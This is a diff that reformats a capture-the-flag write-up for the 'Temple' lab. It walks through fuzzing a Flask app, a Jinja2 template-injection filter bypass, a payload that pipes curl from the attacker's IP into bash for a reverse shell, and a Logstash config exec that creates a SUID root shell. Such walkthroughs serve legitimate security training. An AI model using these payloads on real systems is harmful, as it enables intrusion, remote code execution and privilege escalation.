@@ -1,6 +1,6 @@
-Temple - Hard
+**Temple - Hard**
 
-Category: Security, Web, Hacking, Flask
+**Category: Security, Web, Hacking, Flask**
 
 
 Thoughts about the challenge before starting the challenge.
@@ -9,16 +9,17 @@ Python Werkzeug Flask is well known in CTFs to contain SSTI vulnerability, and t
 The difficulty of the challenge could be based on how hard it is to find the vulnerability, if it is hard to exploit, bypassing of filters, and as well the difficulty of the privilege escalation.
 
 
-Process for obtaining Flag1.txt:
+**Process for obtaining Flag1.txt:**
 
-Open ports and services:
+**Open ports and services:**
+````
 7 echo: this service only echoes back what is being sent to it.
 21 ftp - 22 ssh - 23 telnet: not leaking any sensitive data and would be time-consuming to brute force.
 80 Apache HTTP: Not more than the default Apache site.
 61337 Werkzeug HTTP: Based on the thoughts of the challenge, this is the service that most likely would contain the SSTI vulnerability and the service being tested at the highest priority.
+````
 
-
-When accessing the website http://IP:61337, we are being redirected to /login.
+When accessing the website ````http://IP:61337````, we are being redirected to ````/login````.
 This path only contains a login form and has no functionality to access other paths.
 The source code does not leak any other paths.
 
@@ -29,19 +30,20 @@ The login form is tested with simple SQLi and more advanced, as well as the auto
 Next is file and directory discovery through fuzzing.
 Because this is a Flask web application, the fuzzing would be done without extensions.
 Initially, I would always use a short wordlist with common names.
-In Kali Linux, a standard wordlist is found at /usr/shar/wordlist/dirb/common.txt.
+In Kali Linux, a standard wordlist is found at ````/usr/shar/wordlist/dirb/common.txt````.
 This gave some results, but not what was needed. Therefore it was essential to test with other wordlists.
-The other wordlists are the SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-(small|medium|big).txt.
+The other wordlists are the ````SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-(small|medium|big).txt````.
 As for this, I start with the smallest wordlist first and then escalate to the bigger wordlists if needed.
 This was a time-consuming task at first, and it tested the patience of the enumeration process.
-The biggest tip for this process is to use FFUF and set the threads flag at a high level.
-I found that both 100 and 200 threads gave the same result. This gave me the result after 3 minutes and 40 seconds.
-If running default at the configuration of 40 threads, this would take a lot more time. If the service is slow, it could take over an hour.
+````The biggest tip for this process is to use FFUF and set the threads flag at a high level.````
+I found that both ````100 and 200 threads gave the same result````. This gave me the result after 3 minutes and 40 seconds.
+If running default at the configuration of ````40 threads````, this would take a lot more time. If the service is slow, it could take over an hour.
 At my first attempt at fuzzing for paths, the last path was not found after one and a half hours of fuzzing.
 This resulted from a slow service and a low amount of threads. 
 
 
-common.txt result:
+**common.txt result:**
+````
 302 - /account                                              
 403 - /admin                                                
 302 - /application                                           
@@ -53,23 +55,25 @@ common.txt result:
 200 - /robots.txt                                            
 403 - /temporary
 403 - /temporary/dev
+````
 
-SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+**SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:**
+````
 200 - /temporary/dev/newacc
-
+````
 
 The endpoint found is an endpoint where we could create an account.
-This only requires an email, username, and password where the username must be longer than 5 and the password longer than 8.
-After creating the account, we could login to the user portal, which gives access to the paths with the 302 code.
+This only requires an ````email, username, and password```` where the username must be longer than ````5```` and the password longer than ````8````.
+After creating the account, we could login to the user portal, which gives access to the paths with the ````302 code````.
 
 
-Under the path /account, the representative account username is displayed.
+Under the path ````/account````, the representative account username is displayed.
 This is important to test further since it could display an SSTI vulnerability.
-By creating a new account with {{5*5}} as username, the username displayed when logged in should display 25 if it is vulnerable.
+By creating a new account with ````{{5*5}}```` as username, the username displayed when logged in should display ````25```` if it is vulnerable.
 If not, it could be filtered to bypass, or the correct field still needs to be found.
 
 
-After creating an account with username {{5*5}}, the account path does show 25, which means it has an SSTI vulnerability, as expected from the name and category.
+After creating an account with username ````{{5*5}}````, the account path does show ````25````, which means it has an SSTI vulnerability, as expected from the name and category.
 This could be exploited with os commands and reverse shell.
 
 
@@ -82,116 +86,119 @@ This means we have to find other ways to bypass different filters which could be
 For this, I found this site through Google: https://hackmd.io/@Chivato/HyWsJ31dI#RCE-bypassing-as-much-as-I-possibly-can
 
 
-The one used was this:
+**The one used was this**:
+````
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
-
+````
 
 This is still rejected because a hacking attempt was made, but based on the website, this should bypass most of the filters.
-I tested the same but changed the ' to," and this was the last bypass needed.
-
+I tested the same but changed the ````'```` to, ````"```` and this was the last bypass needed.
+````
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("whoami")|attr("read")()}}
+````
 
-
-This gave the result in the username field of the account endpoint, bill, which means that the bill user on the server is the user who owns the running service.
-This would also make the reverse shell identity bill after successful exploitation.
+This gave the result in the username field of the account endpoint, ````bill````, which means that the ````bill```` user on the server is the user who owns the running service.
+This would also make the reverse shell identity ````bill```` after successful exploitation.
 For the process of gaining foothold, it is essential to start a listener.
 When testing basic reverse shells, it was either reported as a hacking attempt or not giving a result to the listener.
 Then I tested with a simple curl command to my IP and the listening port, which gave a hit.
 This means we could create a simple bash reverse shell in a file and then open a Python server, making the curl command possible to access the file.
-Therefore, changing whoami from the SSTI above to "curl http://IP:port/reverseshellfile|bash" would collect and execute the code.
-
+Therefore, changing ````whoami```` from the SSTI above to ````curl http://IP:port/reverseshellfile|bash```` would collect and execute the code.
+````
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl http://10.9.80.181/sstibypassshell|bash")|attr("read")()}}
+````
+
+After inserting this as the username and creating the account, a reverse shell is spawned when accessing the ````/account```` path.
+This gave foothold as ````bill````, and the first flag was found under ````/home/bill/flagg1.txt````.
 
 
-After inserting this as the username and creating the account, a reverse shell is spawned when accessing the /account path.
-This gave foothold as bill, and the first flag was found under /home/bill/flagg1.txt
-
-
-Useful commands for a better shell:
-
+**Useful commands for a better shell:**
+````
 1. on the target: python3 -c 'import pty;pty.spawn("/bin/bash")'
 2. on the target: export TERM=xterm
 3. on the target: Ctrl + Z
 4. in the same window as the target is being backgrounded: stty raw -echo; fg
 5. on the target: stty rows 38 columns 116
+````
 
 This would make it possible to arrow up for earlier commands, clear to clear the terminal.
-The terminal is not being exited with CTRL + C, making it possible to run other scripts on the target and use CTRL + C to exit that script and not the terminal reverse shell.
+The terminal is not being exited with ````CTRL + C````, making it possible to run other scripts on the target and use ````CTRL + C```` to exit that script and not the terminal reverse shell.
 
 
-Process for obtaining Flag2.txt:
+**Process for obtaining Flag2.txt:**
 
 When enumerating for escalating possibilities, I always check manually at first before using auto scripts like Linpeas.
 This is because some escalations could often be found faster by one or multiple commands than by a script running multiple processes to gather critical information.
-For this, commands like "netstat -tvlp" to look for undiscovered open ports or locally open ports,
-"find / -perm -4000 2>/dev/null" to find SUID binaries which could be abused,
-check directories like /home for which users we could privesc to, /opt /tmp for abnormalities, the flask application found at /home/bill/web app as well as running processes.
-For running processes, I like to use pspy64 since it would check live processes and spawning processes, which could give a cronjob run by root that could be used.
-Using ps for running processes could miss cronjobs being executed.
+For this, commands like ````netstat -tvlp```` to look for undiscovered open ports or locally open ports,
+````find / -perm -4000 2>/dev/null```` to find SUID binaries which could be abused,
+check directories like ````/home```` for which users we could privesc to, ````/opt /tmp```` for abnormalities, the flask application found at ````/home/bill/webapp```` as well as running processes.
+For running processes, I like to use ````pspy64```` since it would check live processes and spawning processes, which could give a cronjob run by root that could be used.
+Using ````ps```` for running processes could miss cronjobs being executed.
 
 
-When using the pspy64, a binary: /usr/share/logstash/jdk/bin/java is being executed by root.
+When using the ````pspy64````, a binary: ````/usr/share/logstash/jdk/bin/java```` is being executed by root.
 Searching for logstash at hacktricks introduces us to a privilege escalation possibility.
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash
 
 
-The first indicator for this vulnerability is if this file /etc/logstash/pipelines.yml contains 'path.config: "/etc/logstash/conf.d/*.conf"'.
+The first indicator for this vulnerability is if this file ````/etc/logstash/pipelines.yml contains 'path.config: "/etc/logstash/conf.d/*.conf"'````.
 The * means it would use all the .conf files inside the path /etc/logstash/conf.d/. 
 
 
-pipeline.yml on the target, which indicated what was explained above from hacktricks.
-
+````pipeline.yml```` on the target, which indicated what was explained above from hacktricks.
+````
 - pipeline.id: main
   path.config: "/etc/logstash/conf.d/*.conf"
-
+````
 
 The following important part of this exploit is to have write permission to the directory conf.d or a file inside.
-In this case, we do not have write permission to the directory, but we have write permission to the only conf file inside the directory: logstash-sample.conf.
-
+In this case, we do not have write permission to the directory, but we have write permission to the only conf file inside the directory: ````logstash-sample.conf````.
+````
 dr-xr-xr-x   2 root root  4096 Oct  3  2021 conf.d
 -r--r--rw- 1 root root 101 Oct  4  2021 logstash-sample.conf
-
+````
 
 The last thing we need is a way to reload the service.
-The file /etc/logstash/logstash.yml contains information about the config reloading automatically every third second.
+The file ````/etc/logstash/logstash.yml```` contains information about the config reloading automatically every third second.
 This means it is possible to exploit the vulnerability.
 
 
-logstash.yml
+````logstash.yml```` on the target, which indicates the reloading process.
+````
 config.reload.automatic: true
 config.reload.interval: 3s
+````
 
-
-By writing this code into the config file, we would copy the /bin/bash binary to a replica and add SUID privileges to the binary,
-which means we could run this binary with the -p flag and have root privileges.
+By writing this code into the config file, we would copy the ````/bin/bash```` binary to a replica and add SUID privileges to the binary,
+which means we could run this binary with the ````-p```` flag and have root privileges.
 This code is the one found at https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash , but with another command.
 
 
-privesc exploit:
-
+**privesc exploit:**
+````
 input {
-  exec {
-    command => "cp /bin/bash /tmp/bash; chmod +s /tmp/bash"
-    interval => 120
+  exec {  
+    command => "cp /bin/bash /tmp/bash; chmod +s /tmp/bash"    
+    interval => 120    
   }
 }
 
 output {
-  file {
-    path => "/tmp/output.log"
-    codec => rubydebug
-  }
+  file { 
+    path => "/tmp/output.log"   
+    codec => rubydebug   
+  }  
 }
+````
+
+The last flag is then found at ````/root/flag2.txt````.
 
 
-The last flag is then found at /root/flag2.txt
-
-
-More information:
+**More information:**
 
 We got access to the bill user based on the SSTI, but there were also found 2 other users, frankie and princess.
-After the challenge was completed, there was found a possibility to crack the princess password based on the hash found in /etc/shadow.
+After the challenge was completed, there was found a possibility to crack the princess password based on the hash found in ````/etc/shadow````.
 This was only tested with the Rockyou wordlist. This indicates that the server allows users to have bad passwords.
 
 It is also possible to obtain access to the MySQL service.
-Credentials for this service are leaked in the /home/bill/webapp/app.py.
+Credentials for this service are leaked in the ````/home/bill/webapp/app.py````.
